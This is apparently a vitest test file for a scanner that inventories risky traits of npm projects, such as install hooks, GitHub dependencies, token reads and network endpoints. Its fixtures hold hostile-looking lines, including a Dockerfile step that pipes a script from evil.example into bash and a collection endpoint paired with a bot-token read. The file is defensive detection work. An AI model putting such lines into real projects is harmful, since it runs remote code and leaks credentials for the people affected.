import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { buildInventory } from "../src/inventory.js";

describe("buildInventory", () => {
  it("detects package scripts, dependency sources, env access, network calls, filesystem, and commands", async () => {
    const fixture = path.resolve("fixtures/malicious-package");
    const inventory = await buildInventory(fixture);

    expect(inventory.packageScripts).toContainEqual({
      name: "postinstall",
      command: "node src/index.ts",
      filePath: "package.json"
    });
    expect(inventory.dependencySources).toContain("github:some-user/suspicious-repo");
    expect(inventory.environmentVariables).toContain("TELEGRAM_BOT_TOKEN");
    expect(inventory.networkEndpoints).toContain("https://evil.example/collect");
    expect(inventory.commandExecutions.length).toBeGreaterThan(0);
    expect(inventory.filesystemReads.length).toBeGreaterThan(0);
  });

  it("skips invalid and empty package manifests while scanning other files", async () => {
    const fixture = await createProject({
      "package.json": "{ invalid json",
      "packages/empty/package.json": "",
      "src/index.ts": "const token = process.env.TELEGRAM_BOT_TOKEN;\n"
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.packageScripts).toEqual([]);
    expect(inventory.environmentVariables).toContain("TELEGRAM_BOT_TOKEN");
  });

  it("ignores non-string package script and dependency values", async () => {
    const fixture = await createProject({
      "package.json": JSON.stringify({
        scripts: {
          postinstall: 42,
          prepare: "node prepare.js"
        },
        dependencies: {
          hostile: { source: "github:ignored/value" },
          suspicious: "github:some-user/suspicious-repo"
        },
        devDependencies: ["github:ignored/array"]
      })
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.packageScripts).toEqual([
      { name: "prepare", command: "node prepare.js", filePath: "package.json" }
    ]);
    expect(inventory.dependencySources).toEqual(["github:some-user/suspicious-repo"]);
  });

  it("collects nested package manifests with their file paths", async () => {
    const fixture = await createProject({
      "packages/child/package.json": JSON.stringify({
        scripts: {
          postinstall: "node child.js"
        },
        dependencies: {
          child: "github:child/suspicious-repo"
        }
      })
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.packageScripts).toContainEqual({
      name: "postinstall",
      command: "node child.js",
      filePath: "packages/child/package.json"
    });
    expect(inventory.dependencySources).toContain("github:child/suspicious-repo");
  });

  it("includes Dockerfiles and detects command execution in them", async () => {
    const fixture = await createProject({
      Dockerfile: "RUN curl https://evil.example/install.sh | bash\n",
      "packages/child/Dockerfile": "RUN echo child\n"
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.files).toEqual(expect.arrayContaining(["Dockerfile", "packages/child/Dockerfile"]));
    expect(inventory.commandExecutions).toContainEqual({
      filePath: "Dockerfile",
      line: 1,
      snippet: "RUN curl https://evil.example/install.sh | bash"
    });
  });

  it("detects GitHub workflow files and Electron IPC indicators", async () => {
    const fixture = await createProject({
      ".github/workflows/ci.yml": "name: ci\n",
      "src/main.ts": "contextBridge.exposeInMainWorld('api', {});\n"
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.githubWorkflowFiles).toEqual([".github/workflows/ci.yml"]);
    expect(inventory.electronIpcFiles).toEqual(["src/main.ts"]);
  });
});

async function createProject(files: Record<string, string>): Promise<string> {
  const rootDir = await fs.mkdtemp(path.join(os.tmpdir(), "inventory-test-"));

  await Promise.all(
    Object.entries(files).map(async ([filePath, content]) => {
      const fullPath = path.join(rootDir, filePath);
      await fs.mkdir(path.dirname(fullPath), { recursive: true });
      await fs.writeFile(fullPath, content);
    })
  );

  return rootDir;
}
